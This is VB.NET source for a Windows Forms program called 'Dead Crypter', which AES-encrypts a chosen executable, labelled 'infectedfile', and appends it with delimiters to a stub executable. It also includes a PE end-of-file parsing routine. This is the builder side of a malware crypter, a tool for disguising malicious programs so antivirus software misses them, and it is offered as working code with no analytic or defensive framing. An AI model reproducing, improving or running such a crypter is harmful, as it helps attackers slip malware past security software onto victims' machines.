Imports System.Security.Cryptography
Imports System.IO
Imports System.Text
Imports System.Runtime.InteropServices
Public Class Form1
    Dim infectedfile, stub As String
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        With OpenFileDialog1
            .FileName = ""
            .Filter = "Executable(*.exe)|*.exe"
            .Title = "Dead Crypter"
            .ShowDialog()
            TextBox1.Text = .FileName
            infectedfile = TextBox1.Text
        End With
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Dim key As String = "3p699792sq691s854374n76841899n6p867nqr2r4247707436n4776oo38083sn"
        Dim Splitt As String = "8bda087801ee923b02ff7a5447b6c9b8416da33aed3536bc3aad1bf463442db5"
        Dim Cryptfile As String
        FileOpen(1, ("stub.exe"), OpenMode.Binary)
        stub = Space(LOF(1))
        FileGet(1, stub)
        FileClose(1)
        FileOpen(1, (TextBox1.Text), OpenMode.Binary)
        infectedfile = Space(LOF(1))
        FileGet(1, infectedfile)
        FileClose(1)
        Cryptfile = infectedfile
        Dim oAesProvider As New RijndaelManaged
        Dim btClear() As Byte

        Dim btSalt() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}

        Dim oKeyGenerator As New Rfc2898DeriveBytes(key, btSalt)

        oAesProvider.Key = oKeyGenerator.GetBytes(oAesProvider.Key.Length)
        oAesProvider.IV = oKeyGenerator.GetBytes(oAesProvider.IV.Length)

        Dim ms As New IO.MemoryStream
        Dim cs As New CryptoStream(ms, _
            oAesProvider.CreateEncryptor(), _
            CryptoStreamMode.Write)
        btClear = System.Text.Encoding.UTF8.GetBytes(Cryptfile)
        cs.Write(btClear, 0, btClear.Length)
        cs.Close()
        Cryptfile = Convert.ToBase64String(ms.ToArray)
        FileOpen(1, (TextBox1.Text & "-Crypted.exe"), OpenMode.Binary)
        FilePut(1, stub)
        FilePut(1, Splitt)
        FilePut(1, Cryptfile)
        FilePut(1, Splitt)
        FileClose(1)
        MsgBox("Error:")
        MsgBox("File Crypted Succesfully", MsgBoxStyle.Information, "Success")
    End Sub
    Public Shared Function StrToByteArray(ByVal str As String) As Byte()
        Dim encoding As New System.Text.ASCIIEncoding()
        Return encoding.GetBytes(str)
    End Function
    Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal Destination As Long, ByVal Source As Long, ByVal Length As Integer)

    Function GetEOF(ByVal Path As String) As Long
        Dim ByteArray() As Byte
        Dim PE As Long, NumberOfSections As Integer
        Dim BeginLastSection As Long
        Dim RawSize As Long, RawOffset As Long

        FileOpen(10, Path, OpenMode.Binary, OpenAccess.Default)
        ReDim ByteArray(LOF(10) - 1)
        FileGet(10, ByteArray)
        FileClose(10)

        Call CopyMemory(PE, ByteArray(&H3C), 4)
        Call CopyMemory(NumberOfSections, ByteArray(PE + &H6), 2)
        BeginLastSection = PE + &HF8 + ((NumberOfSections - 1) * &H28)
        Call CopyMemory(RawSize, ByteArray(BeginLastSection + 16), 4)
        Call CopyMemory(RawOffset, ByteArray(BeginLastSection + 20), 4)
        GetEOF = RawSize + RawOffset

    End Function
End Class
